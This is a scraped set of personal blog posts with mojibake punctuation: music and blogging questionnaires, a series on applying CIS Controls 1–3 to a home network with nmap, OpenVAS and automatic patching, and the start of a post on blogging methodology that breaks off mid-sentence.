Similar to the last blogging challenge I did, it consists of a series of questions that I‚Äôll answer throughout. I got the idea from Flamed Fury &amp; The Shrediverse (though no one ‚Äútagged‚Äù me, I‚Äôm goin‚Äô for it anyway). Music Challenge QuestionsHere are the 10 questions that make up the ‚ÄúMusic Questions Challenge‚Äù. What are five of your favorite albums? What are five of your favorite songs? Favorite Instrument(s)? What song or album are you current listening to? Do you listen to the radio? If so, how often? How often do you listen to music? How often do you discover music? And how do you discover music? What‚Äôs a song or album that you enjoy that you wish had more recognition? What‚Äôs your favourite song of all time? Has your taste in music evolved over the years?What are five of your favorite albums?I recently wrote about my ‚ÄúZero-skip albums‚Äù, but though I like each song on those albums, that doesn‚Äôt necessarily make them my favorite. Though there is plenty of cross-over between that list and the one below. Here‚Äôs my five favorites (in no particular order)‚Ä¶ Hybrid Theory, Linkin Park: THE formative music for me. I still love it the same as I did in like middle school. A Night at the Opera, Blind Guardian: If you like power metal (and you should), this is the band you should listen to. This album is haunting and beautiful. In Keeping Secrets of Silent Earth: 3, Coheed and Cambria: First heard this in highschool. Coheed is one of my favorite artists of all time and this is my favorite of their albums. Jackpot Juicer, Dance Gavin Dance: I love every song on this album just-about. It‚Äôs one of my go-tos for working out too. Close to the Edge, Yes: I went through a big Yes phase around my college years. This album was on constant repeat. I don‚Äôt listen to it nearly as much nowadays, but it forever remains in my top albums list. Some honorable mentions‚Ä¶ The Yes Album, Yes Us Against the Crown, State Radio Gravity, Our Lady Peace Happiness‚Ä¶Is Not a Fish That You Can Catch, Our Lady Peace Deloused in the Comatorium, The Mars Volta Treehouse, I See Stars Believe, Disturbed Random Access Memories, Daft Punk The Afterman: Descension, Coheed and Cambria No World for Tomorrow, Coheed and Cambria Good Apollo I‚Äôm Burning Star IV, Coheed and Cambria Saturate, Breaking Benjamin Make Yourself, IncubusWhat are five of your favorite songs?Ooph, choosing just five is tough. But here goes‚Ä¶ (will save my #1 favorite for later, so there‚Äôs a bonus here. ) No Leaf Clover, Metallica In Keeping Secrets of Silent Earth: 3, Coheed and Cambria Civil War, Guns &amp; Roses And Then There Was Silence, Blind Guardian Close to the Edge, Yes (The Yessongs Live version)Favorite Instrument(s)?I guess probably guitar. What song or album are you current listening to?Most recently I‚Äôve been listening to the Weeknd‚Äôs new album, Hurry Up Tomorrow. But since writing this piece I‚Äôve been listening to various of my favorites listed throughout this piece. At this exact moment, I‚Äôm listening to Close To The Edge. Do you listen to the radio? If so, how often?Nope. Though I do listen to Apple Music ‚Äúradio stations‚Äù from time to time to discover new music. How often do you listen to music?Every day, multiple times a day. I‚Äôll listen to music while I work, while I clean up around the house, and (loudly) when I work out. How often do you discover music? And how do you discover music?Not as often as I should. I go through spurts of discovery a few times a year at best. I primarly discover music through Apple Music stations that I create based on other music I like. Though I‚Äôve been increasingly discovering music via social media. Shoutout to @jcrabapple! What‚Äôs a song or album that you enjoy that you wish had more recognition?This is an interesting question for me. Honestly I don‚Äôt have a great sense of what songs/albums/artists have what recognition. The album From One by Ra is amazing and I really have never heard of anyone talk about this artist before. Go listen to it! What‚Äôs your favourite song of all time?This one was painfully tough. But I gotta go with Stairway. Has your taste in music evolved over the years?In some ways yes, in other ways eh‚Ä¶ I have a huge music library and enjoy a lot of different things. But when it comes to music I actually put on and listen to, my taste has been the same for a decent while now. I previously wrote about music that is particularly nostalgic for me, but this doesn‚Äôt necssarily reflect all I was listening to throughout the years. An attempt to ‚Äúsum up‚Äù my music taste(s) throughout the years is below‚Ä¶ Pre-High School: Linkin Park, Papa Roach and similar stuff. High School: Coheed and Cambria, In Flames, other death metal, Led Zeppelin, Lots of classic rock College: Yes, State Radio Post-College-Now: I find myself listening to a lot of rock and metal, so pretty similar to how it‚Äôs always beeen. Notably less classic rock in my routine listening fwiw. Next up, I challenge/tag CMDR Nova &amp; Apis Necros!

Get to know a little bit more about my blog as I answer these 8 questions. (Courtesy of The Hive) Blog Challenge QuestionsHere are the 8 questions that make up the ‚ÄúBlog Questions Challenge‚Äù Why did you start blogging in the first place? What platform are you using to manage your blog and why did you choose it? Have you blogged on other platforms before? How do you write your posts? For example, in a local editing tool, or in a panel/dashboard that‚Äôs part of your blog? When do you feel most inspired to write? Do you publish immediately after writing, or do you let it simmer a bit as a draft? What‚Äôs your favourite post on your blog? Any future plans for your blog? Maybe a redesign, a move to another platform, or adding a new feature?Why did I start blogging?: I‚Äôve talked about this here. Basically, I had a good idea or two of things to write about, and thought maybe more things would come‚Ä¶ Better question is why do I keep blogging. So many reasons! What platform am I using?: I cover this in my /architecture page! Honestly, I think the reason I chose GitHub Pages + Jekyll was that it was easy and the first thing I came across that seemed easy. I had tried (and failed) to stand up a blog in the past. I needed something low-effort, that would allow me to just write and publish. If I was setting something up today, would I still choose Jekyll+GH Pages? I actually might. It‚Äôs been really great to be honest. But there are a lot of great options I‚Äôd also consider. Have I blogged on other platforms?: Barely. At one point I owned the ‚Äútechfari. com‚Äù domain and wrote one post on Medium. I forget what it was even about. How do I write my posts?: I‚Äôve published a few things about how I write‚Ä¶ A Multiplicity of Writing: A look at the different types of content I publish here. My blogging methodology My process for writing when I was a little more iPad-forward I‚Äôve discussed how I write in my architecture page too Finally, perusing my /uses page will give you a pretty good understanding of my setup and what I use to do what I doBut im short, as of right now, I write everything in VSCode. When do I feel most inpsired?: Honestly I think it‚Äôs in moments like these, when I am writing in response to something. Maybe i‚Äôm commenting on another blog post, or maybe it‚Äôs in response to a thread I‚Äôve seen elsewhere, or a question someone has asked. In those pieces, what I write has a purpose. Do I publish immediately?: Pretty much. I don‚Äôt like to spend time writing something only to have it sit and waste away. I always reserve the right to delete, or update things I‚Äôve published. In fact, updating/adding stuff to existing posts is something I do all the time. I consider very little of what I write to be true point-in-time thinking. Instead, these are all resources to me (and maybe others), so I want things to be updated with the latest and greatest facts and thoughts. What‚Äôs my favorite post on my site?: Great question. Tough one. Really hard to pick for me. I‚Äôd say my favorite blog post is ‚ÄúThe Enchiridion of Impetus Exemplar‚Äù, my threat modeling compendium. I use it as a resource for myself all, the, time. But I love so much about my site, it‚Äôs very uniquely me. It‚Äôs filled with all sorts of oddities that I honestly love equally. Another page I particularly like is my Activity Feed page. Do I have future plans?: Of course I do! I‚Äôve (unsurprisingly) documented a lot of my future plans, hopes, dreams, etc‚Ä¶ in various places on my site‚Ä¶ Roadmap Ideas ‚ÄúFuture items‚Äù Various yearly resolutionsIf you‚Äôre reading this and have a blog, why not answer these questions yourself!

This post, as part of a 3-part series are all pieces I had sitting in my drafts folder since the beginning of 2021. As such, they cover a version of the CIS Critical Security Controls that is rather old at this point. Still, I thought the content relevant and interesting enough to publish (as-was), even after all these years. Let me know what you think!CIS Control 3: Continuous Vulnerability ManagementCIS Control 3 is Continuous Vulnerability Management, proactively identifying and addressing vulnerabilities across the systems in your environment on a continuous basis. The sub-controls for IG-1-class organizations related to this control are listed below. Specifically, these sub-controls are 3. 4 and 3. 5. Also included in the list below are controls 3. 1 and 3. 2 which ask that automated vulnerability scanning is performed and that these scans are run as credentialed scans. I‚Äôve included these two additional controls as I consider them to be that important, even for small organizations. Not only do I consider these extra two controls important, but I believe they are trivial to perform given you have successfully achieved the first two controls. *Sub-Control 3. 1: Run Automated Vulnerability Scanning Tools *Sub-Control 3. 2: Perform Authenticated Vulnerability Scanning Sub-Control 3. 4: Deploy Automated Operating System Patch Management Tools Sub-Control 3. 5: Deploy Automated Software Patch Management ToolsSecurity Value: Software and firmware are constantly being updated by their respective vendors. The focus of many of these updates are not feature improvements, rather they are security fixes. No further elaboration is needed, it‚Äôs always a good idea to apply security fixes when they become available. To aid in finding missing patches as well as other security flaws such as misconfigurations, we have vulnerability scanners. Sub-control‚Äôs 3. 1 and 3. 2 ask that you scan systems in your environment in an automated, routine and credentialed fashion. Credentialed scans will yield the most comprehensive and high fidelity results, and performing this type of scanning on a frequent automated basis will help ensure that as new vulnerabilities or misconfigurations crop up, they are dealt with with the shortest possible dwell time. Deploy Automated Operating System Patch Management Tools (Sub-Control 3. 4): Sub-control 3. 4 asks that an organization deploy automated software update tools. This section will briefly explain how this can be done for both Windows and Linux operating systems. Windows OS Updates: For Windows systems, a popular PowerShell module exists which allows easy automation of Windows updates. This module is called PSWindowsUpdate. The only requirements for running this PS module is that the host OS be at-least Vista or Server 2008 and that it is running PowerShell 2. 0 or later. For an introductory guide to automating Windows updates using this module, check out the following article. How to Automate Windows Updates Using PowerShell: Short Overview Linux OS Updates: Similarly on Linux, it is easy enough to deploy automated patching. The UnattendedUpgrades package does exactly this! Please reference the guide below for additional help with installation and configuration of this package for automatic OS updates. AutomaticSecurityUpdates Deploy Automated Software Patch Management Tools (Sub-Control 3. 5): Sub-control 3. 5 asks that an organization deploy automated software update tools in order to ensure that operating systems are running the most recent security updates provided by the software vendor. How this can be accomplished for both Windows and Linux systems is described in greater detail below. Windows Software Updates: Windows doesn‚Äôt come with a native software package manager like Linux systems. By default, keeping any given piece of software up-to-date on your system requires that for each piece of software, a setting is enabled which allows for automatic installation of new updates from that respective vendor. With this said, a package manager for Windows does exist and can be installed in order to better facilitate automated and centralized software management. For this, I recommend the package management software ‚ÄúChocolatey‚Äù. Installing Chocolatey is as simple as running a few commands in a PowerShell terminal! From here, there are step-by-step guides for doing all things the Chocolatey way. Linux Software Updates: The UnattendedUpgrades module introduced in the section ‚ÄúLinux OS Updates‚Äù is all that is needed to also manage automated software updates in Linux. Run Automated Vulnerability Scanning Tools (Sub-Control 3. 1): Sub-control 3. 1 asks that all systems on the network be automatically scanned on at least a weekly basis to identify potential vulnerabilities. Perform Authenticated Vulnerability Scanning (Sub-Control 3. 2): Sub-control 3. 2 asks that vulnerability scans that are performed are done as authenticated (a. k. a. ‚Äúcredentialed‚Äù) scans.

Sub-Control 2. 1: Maintain Inventory of Authorized Software Sub-Control 2. 2: Ensure Software is Supported by Vendor Sub-Control 2. 6: Address Unapproved SoftwareSecurity Value: Maintenance and routine audit of installed software is key to a secure environment. For each piece of installed software, there is added potential for vulnerability due to increased attack surface. The first step to securing your network is to understand what is on the network, and the first step to securing any individual system on that network is to understand the software that is installed on that system. Subsequently, software should be evaluated to determine whether it is still in active support by the vendor and finally, any unapproved software should be removed from the system. If software is no longer in support by the vendor, it will likely not receive future security updates and therefore may pose a more serious risk to the system. Unauthorized software may be malicious in nature or pose inadvertent risk to the system. Maintain an Inventory of Authorized Software (Sub-Control 2. 1): Let‚Äôs start with sub-control 2. 1 which asks that we maintain an up-to-date list of all authorized software. This inventory can be thought of as a ‚Äúwhitelist‚Äù - anything not on this list is considered unauthorized and therefore should be removed from the system. To create this whitelist, we need to interrogate the systems on the network for what software is currently installed. A network scanning tool such as OpenVAS or Nessus can do just that! In the first part of this series I went over the steps for getting up and running with OpenVAS. Take a look at these steps and then follow along with the steps below. OpenVAS Authenticated Scanning: To enumerate software on an endpoint, we will need to be able to authenticate to that endpoint from our scanner. For Linux devices, this means authentication over SSH and for Windows, over SMB. Linux servers will typically have a listening SSH service but if not, it is trivially installed on Linux with the following command. sudo apt install openssh-serverYou can validate the server is enabled and listening as shown below. To get started with authenticated scanning using OpenVAS we need to first create a new Credential. This can be done by going to Configuration‚Äì&gt;Credentials. Just give it a name, select the type of credential and input the username and password. For SSH, username and password will work, though key-based auth is recommended. Similarly for Windows, a username and password can be created. It is also recommended that service accounts (a non-user account) are created for scanning purposes. This way, the scanner can easily be configured with this service account for authenticating to remote machines. Once we have a credential, let‚Äôs create a new Target list. Navigate to Configuration‚Äì&gt;Targets and then create a Target and associate the credential you just created. TIP: You can associate more than one credential with a target list. Now that we have a Target with associated credentials, we can create a new Scan by going to Scans‚Äì&gt;Tasks and creating a new Task with the Scan Targets as the newly created target and the Scan Config being set to ‚ÄúFull and fast‚Äù. Be sure to give the scan task a useful Name. With the scan task created, we can run the it! Give it some time to finish. TIP: Authenticated scans typically finish quicker than unauthenticated scans. This is because the act of local enumeration is much more efficient than remote fingerprinting. Once the scan finishes, click on the ‚ÄúDone‚Äù area of the scan record to view the report. Inside this report (once the default filters have been removed), you can see the results, hosts, ports, etc‚Ä¶ The tab of interest for software inventory is the ‚ÄúApplications‚Äù tab. In here, we can see a list of Application CPE values. In this list we can not only see the list of applications, but also the installed versions of those applications. Awesome! We now have an inventory of software for this system. This list should be evaluated for each scanned system to determine if any of the software is ‚Äúunauthorized‚Äù and should therefore be removed from this system and any other system that the software is on. If there are known vulnerabilities with any specific piece of software, this will show up in the ‚Äúfindings‚Äù tab of the scan report and should be addressed for that reason as well. Troubleshooting Authenticated Scanning: There are a number of issues you may encounter when configuring and running authenticated scans with OpenVas. With both Linux and Windows, you will want to make sure the account you are authenticating as has proper permissions on the remote system. This means having root (or sudo) privileges on Linux and Administrator privileges on Windows. For Windows systems, there are a few additional things you will want to ensure are enabled prior to scanning. File and Printer Sharing must be enabled within the Windows Firewall settings. Allow inbound file and printer exception setting within local group policy must be enabled. The setting ‚ÄúProhibit use of Internet connection firewall on your DNS domain‚Äù must be set to Disabled in the systems local group policy. The Remote Registry service must be enabled. Some additional resources for troubleshooting authenticated scans are provided below. Authenticated Scanning w/ OpenVAS Authenticated Scanning w/ NessusEnsure Software is Supported by Vendor (Sub-Control 2. 2): When software becomes end-of-life, this means the vendor does not intend on releasing security patches for that respective piece of software. When new vulnerabilities are discovered, these risks will go unaddressed and the security posture of your environment will be degraded. The software list we generated in the previous sub-control should be regularly reviewed to determine whether any individual item is no longer supported by the vendor. The software inventory includes version numbers which can be used to help facilitate this task. Address Unapproved Software (Sub-Control 2. 6): When software is identified, via scanning operations, that is not explicitly ‚Äúapproved‚Äù, it should be removed from a system. A technical control for implementing this concept is ‚ÄúApplication Whitelisting‚Äù. Application whitelisting is essentially a piece of software that enforces what other software is allowed to be installed on a system. Any item that is not on the whitelist will be blocked from being installed. New software items can be added with business justification. Application whitelisting on Linux can be achieved through the File Access Policy Daemon. On Windows, AppLocker can be used for software whitelisting. Here‚Äôs another great and very technical guide series for standing up AppLocker. The Automation Dilemma: Inventory and control of software assets for an IG1-class organization comes down to three things‚Ä¶ Maintain an inventory of authorized software. Ensure software is supported by the vendor. Address unapproved software. Achieving these three things is made much easier through the use of automation. The community version of OpenVAS has some limitations when it comes to automating via the GSM API. Without automation, a lot of the work described above is manually performed, week after week. At a small scale (which is the case with IG-1 environments) this may not require too much work but as the network grows in size, so too will the work required to achieve proper software inventory and control. This is where automation steps in. Next in the SeriesThanks for reading! The next chapter in the CIS at Home series covers Control 3: Continuous Vulnerability Management. Previously in the SeriesThe previous chapter in the CIS at Home series covers Control 1: Inventory and Control of Hardware Assets. " }, { "id": 50, "url": "https://shellsharks.com/csc-at-home-part-1", "title": "CSC at Home (Part 1): Hardware Inventory and Control", "body": "2024/05/11 - This is the first in a series of posts discussing the CIS Top 20 controls and how they can be implemented in a home or small-business environment. Before getting into the first of these controls, I‚Äôll begin by providing some introductory background on the CIS Top 20. This post, as part of a 3-part series are all pieces I had sitting in my drafts folder since the beginning of 2021. As such, they cover a version of the CIS Critical Security Controls that is rather old at this point. Still, I thought the content relevant and interesting enough to publish (as-was), even after all these years. Let me know what you think!CIS Top 20The CIS Top 20 controls, published and maintained by the Center for Internet Security (CIS) are in essence, a prioritized set of actions, that when implemented, improve the security posture of your IT environment. The CIS Top 20 was developed by a community of experts and is a well-known and oft-used framework in both the public and private sector. It focuses on all aspects of cybersecurity including identification, protection, detection, response and recovery (these pillars of cybersecurity are described further in NIST‚Äôs CSF). These 20 high-level controls are further broken into smaller sub-controls which more granularly detail how the goals of the parent control are met. It‚Äôs important to stress the prioritized nature of these controls. They are meant to be implemented in order. Implementing control 2 for example, would be fraught without first completing control 1. The current version of the CIS controls (at version 7. 1) details how organizations of varying capabilities and resource capacities can best implement the CIS controls. This concept is built into the framework using the idea of ‚ÄúImplementation Groups‚Äù, of which there are 3 (‚ÄúIG1‚Äù, ‚ÄúIG2‚Äù and ‚ÄúIG3‚Äù). CIS describes an IG1 (‚ÄúImplementation Group 1‚Äù) organization as ‚ÄúA family-owned business with ~10 employees‚Äù. I would consider an IG1 organization as a home-network or small business with little to no dedicated security funding and minimal (or zero) dedicated cybersecurity personnel. CIS also breaks down the 20 controls into three distinct groups, ‚ÄúBasic‚Äù, ‚ÄúFoundational‚Äù and ‚ÄúOrganizational‚Äù. The initial group, ‚ÄúBasic‚Äù, includes the first 6 controls. The subsequent groups contain the next 10 and the next 4 controls respectively. Through this series, I will focus on how an IG1-class organization (such as a small business or simply a home network) can implement these CIS controls. As the write-ups for each control are published, they will be made available in this list below. Basic Control 1: Inventory and Control of Hardware Assets Control 2: Inventory and Control of Software Assets Control 3: Continuous Vulnerability Management Control 4: Controlled Use of Administration Privileges Control 5: Secure Configuration for Hardware and Software Control 6: Maintenance, Monitoring and Analysis of Audit LogsFoundational Control 7: Email and Web Browser Protections Control 8: Malware Defenses Control 9: Limitation and Control of Network Ports, Protocols and Services Control 10: Data Recovery Capabilities Control 11: Secure Configuration for Network Devices, such as Firewalls, Routers and Switches Control 12: Boundary Defense Control 13: Data Protection Control 14: Controlled Access Based on the Need to Know Control 15: Wireless Access Control Control 16: Account Monitoring and ControlOrganizational Control 17: Implement a Security Awareness and Training Program Control 18: Application Software Security Control 19: Incident Response and Management Control 20: Penetration Tests and Red Team ExercisesCIS Control 1: Inventory and Control of Hardware AssetsFor small organizations, the first control is as simple as the name - maintain an up-to-date inventory of your hardware, and implement some control over how that hardware accesses your network. For IG1-class organizations, the relevant sub-controls are as follows. Sub-Control 1. 4: Maintain Detailed Asset Inventory Sub-Control 1. 6: Address Unauthorized AssetsSecurity Value: They say ‚Äúyou can‚Äôt protect what you don‚Äôt know you have‚Äù. This control is the embodiment of that phrase and as it applies to IT security, it makes a lot of sense. Computers and other IT systems don‚Äôt typically come secured out of the box. It takes careful configuration and often times installation of additional software and tools to properly secure most systems. This emphasizes the need to recognize all devices on the network so that they may be actively secured. Maintaining an accurate inventory will help system owners dedicate the proper attention to each device on the network. In addition to knowing what is on your network, it is also recommended to control what devices are allowed on your network. If you are configuring a new device, you may not want it to have full network access until it is fully and completely secured. We also need to monitor the environment for devices which we do not own and have somehow been given unauthorized access to the network. These ‚Äúrogue devices‚Äù are potentially dangerous and must be identified and then removed or quarantined. Maintain Detailed Asset Inventory (Sub-Control 1. 4): Let‚Äôs start with sub-control 1. 4 which asks that we maintain an accurate and up-to-date inventory of all technology assets with the potential to store or process information. The sub-control goes on to say that this inventory shall include all assets, whether connected to the the organization‚Äôs network or not. In terms of the inventory, it‚Äôs a good idea to understand for each system, what it‚Äôs purpose is, the data it processes and who owns it. A proven method for identifying network-resident hosts is to perform discovery scanning. For this, I trust good ol‚Äô NMAP! Before we begin scanning however, it‚Äôs good to have as much of an understanding of the target network as possible. Having a pre-existing network topology/diagram would be a good place to start. With this in hand you can understand if the network is hierarchical/segmented in nature or flat. Knowing this will help you better discover assets across your network. Of course, not everyone has a documented network diagram on-hand, so instead‚Ä¶ Assuming a flat network, first find the IP of one system and begin scanning the network it resides on. TIP: With segmented/hierarchical networks, you may need to whitelist your scanning devices on the firewalls themselves so that scan traffic may freely traverse the different network segments. NMAP: Let‚Äôs get started with discovery scanning using NMAP. Run an ‚Äòifconfig‚Äô or ‚Äòipconfig‚Äô (depending on the OS of your host system), determine your IP address and then start with the following discovery scan. For help installing NMAP, reference the nmap. org site. sudo nmap -sn 192. 168. 1. 0/24 -n --traceroute -oA discoveryresultsQuickly running through the command parameters here‚Ä¶ sudo: This nmap command needs to be run as root since it needs to create raw sockets for sending ICMP packets. -sn: This is the discovery flag which limits nmap probes to ICMP and TCP-based pings. 192. 168. 1. 0/24: If your systems are on the 192. 168. 1. 0/24 Class-C network, this would be a good place to start. Alternatively, your network may house systems with IPs in a different internal (RFC-1918) network range, such as 10. 0. 0. 0/8. Be warned though! /24 (Class-C) networks may only have 256 potential addresses, but class B and class A networks have ~65 thousand and ~16 million IPs respectively. Scanning these would take considerable time. Be sure to input a network subnet here that best fits your target network. -n: Disables DNS resolution. ‚Äìtraceroute: This may help better understand network topology via a traceroute -oA discoveryresults: Finally, save the results of your scan into different formats for later processing in a file named ‚Äúdiscoveryresults‚Äù. Once the scan has finished (this may take considerable time depending on the size of the network you are scanning - feel free to increase scan speed using the command flag ‚Äò-T5‚Äô which is the max speed that can be chosen), we look at the results and begin the inventory process. Primarily, we want to understand the following‚Ä¶ How many devices did we find? Do we know of anything we missed? Of the devices we found, what are they? (e. g. Servers, Workstations, Operating System, etc‚Ä¶) Who is the owner of the devices we found?The ping scan returns some helpful inventory-related information in addition to simply whether a system was found ‚Äúlive‚Äù on the network. Namely, the MAC address for each system is found and with this mac address, NMAP can hint at what that device may be as MAC addresses map back to specific manufacturers. Nmap scan report for 192. 168. 1. 6Host is up (0. 81s latency). MAC Address: 64:52:99:A7:7F:D8 (The Chamberlain Group)As can be seen in the NMAP output above, based on the MAC address of this discovered system, the owner is likely ‚ÄúThe Chamberlain Group‚Äù. I now know that this is my smart garage door controller. Neat! OpenVAS: NMAP is a great tool, and it is a great place to start when first doing discovery scanning on your network. However, without considerable extensions to basic functionality, NMAP is not the ideal solution for maintaining an enterprise-grade hardware asset inventory. For this, one could instead turn to a more feature-filled ‚ÄúVulnerability Management‚Äù tool and full-featured scanner such as OpenVAS or Nessus. OpenVAS, originally ‚ÄúGNessUs‚Äù began as a fork of the previously open-source Nessus tool. Once Tenable took Nessus proprietary, OpenVAS continued to be maintained as an open-source alternative. Since then, its maintainers, Greenbone Networks have continued to develop OpenVAS as part of its larger vulnerability management product known as Greenbone Security Manager or ‚ÄúGSM‚Äù. NOTE: I will likely use the terms ‚ÄúGSM‚Äù and ‚ÄúOpenVAS‚Äù interchangeably. OpenVAS Installation &amp; Usage: To get started with GSM, Greenbone offers a free ‚Äútrial‚Äù (the trial has some functionality limited compared to the fully-licensed version) via the downloadable Greenbone Security Manager Virtual Appliance. This virtual appliance can be spun up using virtualization software such as VirtualBox or VMware. In the spirt of free and open-source, Greenbone provides detailed installation instructions for getting up and running with GSM inside VirtualBox. To get started, simply download the virtual appliance! Once you have the GSM up and running (I recommend following the install guide from GreenBone), log into the web interface. To configure your first discovery scan, first go to Configuration‚Äì&gt;Targets (on the main dashboard) and create a New Target (using the button in the top left). Unlike with NMAP, GSM will be unable to scan an entire /16 network range, /24 is the highest it can go. Given this limitation, using NMAP to first discover systems on the wider network and then creating targets in OpenVAS which map to the class C subnets found in NMAP would be the best approach. Conversely, rogue-device scanning (covered later in control 1. 6) is probably best done with NMAP. Alternatively of course, you could configure 250+ targets in OpenVAS for each class C within the larger class B but that is likely well beyond what you will need. With my network, I stuck with the 192. 168. 1. 0/24 (class C) network and I left every other field in this Target wizard as the default value. With that Target created, we can then go to Scans‚Äì&gt;Tasks and click the ‚ÄúNew Task‚Äù button in the top left. In this form, input a name (like ‚ÄúDiscovery Scan‚Äù for example), set the scan targets using the drop-down menu to the Target object you created in the previous step and then set the ‚ÄúScan Config‚Äù drop-down field to ‚ÄúBase‚Äù. All other fields can be left default for now. Click save. TIP: The ‚ÄúBase‚Äù scan (as opposed to the ‚ÄúDiscovery‚Äù scan template) performs the minimum set of actions required for host-discovery within OpenVAS. Once saved, the scan can be run by clicking the play button on the Tasks main page (on the line where the new task was created). Now sit back, grab a quick snack or a cup of coffee and let the scanner do its thing! ‚Ä¶ Once finished, navigate back to the Scans‚Äì&gt;Tasks pane, click on the link for the completed scan and then click on the blue status icon ‚ÄúDone‚Äù. Once inside the scan results, click the ‚ÄúResults‚Äù tab and click ‚ÄúRemove all filter settings‚Äù. You can then click over to the ‚ÄúHosts‚Äù tab and see all the devices discovered! Further, you navigate to the ‚ÄúOperating Systems‚Äù tab to see a breakdown of all the devices found and what Operating System OpenVAS has determined that each device is running. Congrats, you now have a starting hardware inventory for network-connected devices. Now let‚Äôs take a closer look at what we found. As seen below, I found 27 unique hosts on my network. Great. Based on my previous understanding of the network, do I believe there is anything missing from this list? If so, I may want to troubleshoot why the scanner did not find it. Perhaps the missing device is behind a firewall that my scanner couldn‚Äôt traverse? Does the system in question deny ICMP and/or TCP-based pings? Was the device off the network at the time of the scan? These are a couple of good questions to ask. Going a little deeper now‚Ä¶ What exactly are the devices we found with our scan? As I mentioned, scanners like NMAP and OpenVAS have some foot-printing capabilities to help you determine what Operating Systems a device is running or who the device manufacturer is. By clicking into an IP Address found in the ‚ÄúHosts‚Äù tab, you can see additional details on individual systems. This will include a ‚ÄúCommon Platform Enumeration‚Äù (CPE) value which suggests a likely OS for the respective system. Finally, a good practice for maintaining a hardware inventory is to understand, for each identified system, who the owner is. For home network environments, this may be easy to figure out. For small business organizations, it may require manually interviewing potential system owners to determine who owns what. Knowing what the device is, what OS it runs and other types of information can help you narrow down who the potential owner may be. Once you have this information, or as you find out this information, you can tag assets in OpenVAS with the owner (or any other metadata you find valuable). To do this, go to Configuration‚Äì&gt;Tags, create a new tag, give it a name, such as ‚ÄúOwner‚Äù, a value of the owner name and the Resource Type ‚ÄúHost‚Äù. From there you can select discovered Resources from the dropdown to associate with that tag. As new devices are discovered, be sure to assign them a tag. If you can‚Äôt figure out what a device is, further investigation is required to determine if it is an authorized device or not. TIP: I recommend creating a tag called ‚ÄúAuthorized‚Äù (or something similar) and assigning all hosts that tag which have been vetted as an authorized device. This way, as new devices come in, they can easily be identified as new and the vetting process can proceed. TIP: For more on how to get the most out of OpenVAS check out the full documentation of Greenbone Networks GSM. Address Unauthorized Assets (Sub-Control 1. 6): The second fundamental concept of CIS control 1 is that of Hardware Control - keeping unauthorized devices OFF your network. The security value of this control is relatively self-explanatory. Having unauthorized devices communicating on the network and potentially taking malicious actions would certainly have security-related consequences. Ideally, hardware control is achieved via a full-featured Network Access Control (NAC) solution. In a more simplistic implementation, enabling something like ‚ÄúMAC Address Filtering‚Äù would be an alternate technique for keeping unwanted devices off your network. This control however can be bypassed with relative ease for a dedicated attacker as MAC addresses are trivially spoofed. The idea behind MAC address filtering is to white-list certain MAC addresses and any that do not fall within that whitelist will not be allowed to access the network. NAC takes this idea further by implementing additional checks that a system attempting to access the network would need to pass to then be granted access. Rogue-Device Scanning: In the absence of a true preventative network access control we can instead turn to a detective measure. The goal of rogue-device scanning is to identify assets on your network that shouldn‚Äôt be there or are not authorized to be on the network. One common way of performing this sort of scanning is to simply scan the entire internal network address space with something like NMAP. This scan can be run routinely (for example weekly) to regularly audit your network for rogue devices. One weakness of this approach is that if a device pops on the network for only a short period and then goes offline, your scan will be unlikely to catch it. To capture these more temporal rogues, doing some network traffic capture and analyzing that data is a good way to monitor for rogues. This type of scanning can be done using NMAP or OpenVAS. More To Come On Hardware Control‚Ä¶ I‚Äôd like to re-visit this sub-control as part of a further chapter in this CIS-at-home series. Additional CIS Control 1 Resources: The community (free) version of Nessus is a great alternative to OpenVAS but has limitations unless you buy a pro license. - Nessus Essentials Next in the SeriesThanks for reading!

" }, { "id": 51, "url": "https://shellsharks.com/blogging-methodology", "title": "Blogging Methodology", "body": "2024/05/09 - Blogging is more than just writing. One must come up with ideas, research topics, get words / sentences from brain to keyboard (i. e. ‚Äúwrite‚Äù), edit + enrich the words themselves and finally publish content out to its destination. Below I break down my process for blogging. Ideation: Before I can write, I first need an idea of what to write about! So how do I come up with ideas? What are some sources of inspiration? Turns out, I have many! First, it helps that my site isn‚Äôt particularly ‚Äúniche‚Äù. If my blog was strictly infosec content, I would be far more limited in what I could write about. From the beginning, I made sure the theme of my site was scoped broadly, ‚ÄúInfosec, Technology &amp; Life‚Äù, effectively giving myself infinite room to write about anything I wanted. Work, i. e. my professional life, is a great source of ideas and content. If i‚Äôm working on something at my job, or learning something new, there‚Äôs no reason I shouldn‚Äôt write about it! Doing so helps reinforce what I am doing such that I‚Äôm more effective on the job and also helps me create a resource for myself and others later. (Note: Just be sure to keep what you write about is environment/company-agnostic so you don‚Äôt get in any trouble. ) Social media is a great source of ideas. There are lots of conversations and other pieces published by bloggers to take inspiration from. There is a trend of one blogger posting something like ‚ÄúThoughts on Chips‚Äù, and then others writing a response post where they too write about that same subject. So using the collective idea pool of those you follow and by extension, who they follow, is a great way to come up with ideas. Similarly, people tend to ask a lot of questions on social media. Answering a question via a blog post is a great way to write, help someone/the community and also market your site. The act of blogging and maintaining a site has also been, for me, a wellspring of new things to write about. Turns out when you research and write, you come up with more and more ideas! If all else fails, pull ideas from your life. If you have a good recipe, document it! Saw a good movie? Review it! Like your car? Write about it. Anything and everything in your life can be written about. Don‚Äôt worry about whether it will be ‚Äúinteresting‚Äù to others. If it interests you, I guarantee it will interest someone else. In fact, in the past I‚Äôve written about a number of things not to worry about when writing/blogging and I think it is still great advice. Research: I don‚Äôt have a specific, or particulary well-thought-out research methodology. There are posts that I spend a long time writing and researching and many that I do effectively no research on. For the latter, I write it completely off the cuff and ship it. The ‚Äútechnical‚Äù posts tend to be ones that are more link and research-heavy, while posts about things in my life are often written as single trains of thought. Remember! If you‚Äôre posting something on a site you own, you can always edit posts after they are initially published. Nothing is set in stone. So don‚Äôt let perfection be the enemy of just getting something written and published to the world. Writing: So how do I write? I tend to start by just dumping as much as I can think of as lists, relevant links, sections and other raw ideas / thoughts into the doc. From there, I start figuring out the rough framing/skeleton (i. e. sections) of the post will be. Once I know generally the sections I want to write and their order, I just start at the beginning, write the intro and then move on to each successive section. For longer posts, I tend to jump back and forth between writing and editing/enrichment after each section. I find that my writing ‚Äústyle‚Äù is very conversational, and probably riddled with syntactic errors. Editing + Enrichment: The most time-consuming part of my blogging process is editing &amp; enrichment, notably the enrichment part. I tend to read through each section a number of times, each time looking to improve a different aspect‚Ä¶ Flow &amp; wording: This is the first thing I attempt to fix, paragraph-by-paragraph. I try to make sure what I‚Äôve said makes sense, flows together and the words themselves are of quality and non-repetitive. Spelling &amp; grammar: Next, a classic spelling 